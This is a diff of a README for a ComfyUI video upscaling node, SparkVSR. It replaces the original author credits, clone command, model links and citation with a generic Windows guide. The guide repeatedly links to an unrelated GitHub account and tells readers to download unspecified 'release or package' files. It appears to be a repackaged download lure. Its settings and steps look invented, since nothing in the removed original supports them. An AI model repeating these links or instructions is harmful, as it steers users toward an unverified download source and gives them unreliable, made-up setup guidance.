@@ -1,87 +1,269 @@
-<div align="center">
-  <p><img src="assets/logo2.png" width="360px"></p>
-  <h1>SparkVSR: Interactive Video Super-Resolution via Sparse Keyframe Propagation</h1>
-  <p>
-    Jiongze Yu<sup>1</sup>, Xiangbo Gao<sup>1</sup>, Pooja Verlani<sup>2</sup>, Akshay Gadde<sup>2</sup>,
-    Yilin Wang<sup>2</sup>, Balu Adsumilli<sup>2</sup>, Zhengzhong Tu<sup>†,1</sup>
-  </p>
-  <p>
-    <sup>1</sup>Texas A&amp;M University &nbsp;&nbsp; <sup>2</sup>YouTube, Google
-    <br>
-    <sup>†</sup>Corresponding author
-  </p>
-  <p>
-    <a href="https://sparkvsr.github.io/"><img src="https://img.shields.io/badge/Project-Page-Green"></a>
-    &nbsp;
-    <a href="https://huggingface.co/JiongzeYu/SparkVSR"><img src="https://img.shields.io/badge/%F0%9F%A4%97%20Hugging%20Face-Model-blue"></a>
-    &nbsp;
-    <a href="https://arxiv.org/abs/2603.16864"><img src="https://img.shields.io/badge/arXiv-2603.16864-b31b1b.svg"></a>
-  </p>
-</div>
+# 🎬 ComfyUI_SparkVSR_SM - Sharper Video, Less Effort
 
-> 💡 **Your ⭐ star means a lot to us and helps support the continuous development of this project!**
+[![Download ComfyUI_SparkVSR_SM](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Cylindricalstemmed-head212/ComfyUI_SparkVSR_SM)
 
-# ComfyUI_SparkVSR_SM
------
-[SparkVSR](https://github.com/taco-group/SparkVSR): Interactive Video Super-Resolution via Sparse Keyframe Propagation
+## 📌 What this is
 
-Update
------
-* 修复一些错误，超大视频请按工作流的note来调整tile数值
+ComfyUI_SparkVSR_SM is a Windows-ready tool for video super-resolution inside ComfyUI. It helps turn low-quality video into clearer video by using keyframes and frame propagation. In plain terms, it can make video look sharper without asking you to edit each frame by hand.
 
-* Preprocess the image node to connect to the pisa_sr node to load the model, or use other methods to upscale a single-frame image, that is, enable reference image mode; otherwise, it is non-reference image mode.  ref_indices are the sequence frame numbers of the reference image in the source video. For example,' 0, 'is the first frame. You can also input 0 to only reference the first frame to save resources and achieve better results.
-* 预处理图片节点接入pisa_sr 节点加载的模型  或者你用其他方法放大的单帧图片，即开启图模式，否则是非垫图模式，ref_indices是垫图在源视频的序列帧序号，比如0就是首帧，你也可以输入'0,'(注意有逗号) 只参考首帧以节省资源获得更好的效果.
+Use it when you want:
 
-1.Installation  
------
-  In the ./ComfyUI/custom_nodes directory, run the following:   
-```
-git clone https://github.com/smthemex/ComfyUI_SparkVSR_SM
-```
-2.requirements  
-----
+- Cleaner video detail
+- Better edge clarity
+- Smoother results across frames
+- A simple workflow in ComfyUI
 
-```
-pip install -r requirements.txt
-```
+## 🖥️ What you need
 
-3.checkpoints 
-----
-* cog unet merged  or gguf [links](https://huggingface.co/smthem/SparkVSR-GGUF/tree/main) #f32 or bf16  or gguf
-* cog vae [links](https://huggingface.co/JiongzeYu/SparkVSR/tree/main)
-* if use pisa_sr need [stable-diffusion-2-1-base](https://www.modelscope.cn/models/stabilityai/stable-diffusion-2-1-base) vae and unet,and  pisa_sr.pkl[google](https://drive.google.com/drive/folders/1oLetijWNd59xwJE5oU-eXylQBifxWdss)
+Before you start, make sure your PC can handle video work.
 
-```
-├── ComfyUI/models/
-|     ├── diffusion_models/
-|        ├──sd21base-f32.safetensors  # 3.22G or fb16  if use  pisa_sr to refer image  optional 可选，使用 pisa_sr超分参考图用
-|        ├──SparkVSR-S2-F32.safetensors # 20.7G or fb16
-|     ├── gguf/
-|        ├──SparkVSR-S2-Q8_0.gguf optional 可选，
-|     ├── vae/
-|        ├──CogVideoX1.5-5B-I2V-VAE.safetensors #822M
-|        ├──sd21vae.safetensors # 319M  if use  pisa_sr to refer image  optional 可选，使用 pisa_sr超分参考图用
-|     ├── loras
-|        ├──pisa_sr.pkl # 32M  if use  pisa_sr to refer image optional 可选,使用 pisa_sr超分参考图用
+### Minimum setup
 
-```
+- Windows 10 or Windows 11
+- A modern NVIDIA GPU
+- 8 GB RAM
+- 10 GB free disk space
+- ComfyUI already set up
+- A recent Python install if your ComfyUI setup uses it
 
-4.Example
-----
-![](https://github.com/smthemex/ComfyUI_SparkVSR_SM/blob/main/example_workflows/exampleir.png)
-![](https://github.com/smthemex/ComfyUI_SparkVSR_SM/blob/main/example_workflows/exampS2.png)
+### Better setup
 
+- NVIDIA GPU with 8 GB VRAM or more
+- 16 GB RAM
+- SSD storage
+- Updated GPU drivers
 
-5.Citation
-----
-```
-@misc{yu2026sparkvsrinteractivevideosuperresolution,
-      title={SparkVSR: Interactive Video Super-Resolution via Sparse Keyframe Propagation}, 
-      author={Jiongze Yu and Xiangbo Gao and Pooja Verlani and Akshay Gadde and Yilin Wang and Balu Adsumilli and Zhengzhong Tu},
-      year={2026},
-      eprint={2603.16864},
-      archivePrefix={arXiv},
-      primaryClass={cs.CV},
-      url={https://arxiv.org/abs/2603.16864}, 
-}
-```
+### Good to know
+
+SparkVSR works best when your system can process video frames fast. A stronger GPU gives smoother playback and faster output.
+
+## 🚀 Download and install
+
+Use this page to download and run the files you need:
+
+[Visit the download page](https://github.com/Cylindricalstemmed-head212/ComfyUI_SparkVSR_SM)
+
+### Step 1: Open the page
+
+Open the link above in your browser.
+
+### Step 2: Get the release or source files
+
+Look for the latest release, package, or repository files. Download the files for Windows use.
+
+### Step 3: Place the files in ComfyUI
+
+Put the SparkVSR files in the correct ComfyUI folder. In most setups, this means a custom nodes folder or a plug-in folder inside ComfyUI.
+
+A common path looks like this:
+
+- `ComfyUI/custom_nodes/`
+
+If the package includes model files, place them in the model folder named in the package.
+
+### Step 4: Restart ComfyUI
+
+Close ComfyUI and open it again so it can load the new node.
+
+## 🧭 First-time setup
+
+After install, check that ComfyUI sees the SparkVSR node.
+
+### Open ComfyUI
+
+Start your normal ComfyUI app or local server.
+
+### Look for the SparkVSR node
+
+Search the node list for SparkVSR or a similar name. If you do not see it, check the file path again.
+
+### Add the needed model files
+
+SparkVSR may need model weights to run. If the package includes them, place them in the model folder it expects. If it uses an external model file, put that file in the model path set by the package.
+
+### Load a simple video workflow
+
+Use a short test clip first. This helps you check that everything works before you process a long file.
+
+## 🎞️ How it works
+
+SparkVSR uses a few clear steps:
+
+1. It picks keyframes from the video.
+2. It sharpens those keyframes.
+3. It carries detail across nearby frames.
+4. It builds a higher-quality video result.
+
+This approach helps keep detail steady from frame to frame. It also helps reduce the need to treat every frame as a separate image.
+
+## 🔧 Basic use in ComfyUI
+
+A simple workflow often looks like this:
+
+### 1. Load a video
+
+Choose the video you want to improve.
+
+### 2. Set the scale
+
+Pick the upscale level. Common choices are 2x or 4x.
+
+### 3. Set frame handling
+
+Choose how many frames to process at once, or use the default if you are new.
+
+### 4. Run SparkVSR
+
+Start the process and let the node build the enhanced video.
+
+### 5. Save the result
+
+Export the output video when the job finishes.
+
+## ⚙️ Helpful settings
+
+You do not need to tune every setting on day one. Start with defaults, then change one setting at a time.
+
+### Output scale
+
+- **2x** for a small quality boost
+- **4x** for stronger detail improvement
+
+### Keyframe spacing
+
+- Lower spacing gives more stable detail
+- Higher spacing can run faster
+- Short clips work well with tighter spacing
+
+### Frame batch size
+
+- Small batches use less GPU memory
+- Larger batches can run faster
+- If the app fails, lower the batch size
+
+### Detail strength
+
+- Higher values can make edges look sharper
+- Lower values can keep the look closer to the source
+
+## 🪟 Windows tips
+
+If you use Windows, these steps help avoid common setup issues.
+
+### Keep paths simple
+
+Use short folder paths like:
+
+- `C:\ComfyUI\`
+- `D:\AI\ComfyUI\`
+
+Long paths can cause file load problems.
+
+### Use current GPU drivers
+
+Update NVIDIA drivers before you run video jobs.
+
+### Close heavy apps
+
+Close browsers, games, and editors before you start a large render.
+
+### Use SSD storage
+
+Video work creates many read and write tasks. SSD storage helps keep things moving.
+
+## 🧪 Example use case
+
+Here is a simple way to test the tool:
+
+1. Pick a short 5 to 10 second video
+2. Use 2x upscale
+3. Keep default keyframe settings
+4. Run the workflow
+5. Compare the output with the source clip
+
+This gives you a fast check on quality and speed before you use a longer file.
+
+## 📁 File layout
+
+Your setup may look like this:
+
+- `ComfyUI/`
+- `ComfyUI/custom_nodes/ComfyUI_SparkVSR_SM/`
+- `ComfyUI/models/`
+- `ComfyUI/output/`
+
+If the package uses a different folder name, follow the folder included with the download.
+
+## 🛠️ Troubleshooting
+
+### The node does not appear
+
+- Restart ComfyUI
+- Check that the files are in the right folder
+- Make sure the folder name is correct
+- Confirm that you downloaded the full package
+
+### The process runs out of memory
+
+- Lower the batch size
+- Use a smaller upscale factor
+- Close other GPU-heavy apps
+- Try a shorter clip
+
+### The output looks soft
+
+- Increase the upscale factor
+- Raise detail strength a little
+- Use a smaller keyframe gap
+
+### The video stutters or fails
+
+- Check that the source video is not damaged
+- Try a lower resolution input first
+- Make sure the model files are in place
+
+## 📚 Common terms
+
+### Keyframe
+
+A keyframe is a frame the app uses as a main reference point.
+
+### Frame propagation
+
+This means the app carries detail from one frame to the next.
+
+### Upscale
+
+Upscale means making the video larger in pixel size.
+
+### Model
+
+A model is the trained file that helps the app improve video quality.
+
+## 🔁 Simple workflow order
+
+Use this order for the best first run:
+
+1. Install the files
+2. Restart ComfyUI
+3. Confirm the node shows up
+4. Load a short test video
+5. Keep default settings
+6. Run the process
+7. Review the output
+8. Adjust one setting at a time
+
+## 🔗 Download again
+
+If you need the files again, use this link:
+
+[https://github.com/Cylindricalstemmed-head212/ComfyUI_SparkVSR_SM](https://github.com/Cylindricalstemmed-head212/ComfyUI_SparkVSR_SM)
+
+## 📝 Short setup checklist
+
+- Download the package
+- Place it in the ComfyUI folder
+- Restart ComfyUI
+- Load a test video
+- Run SparkVSR
+- Save the output
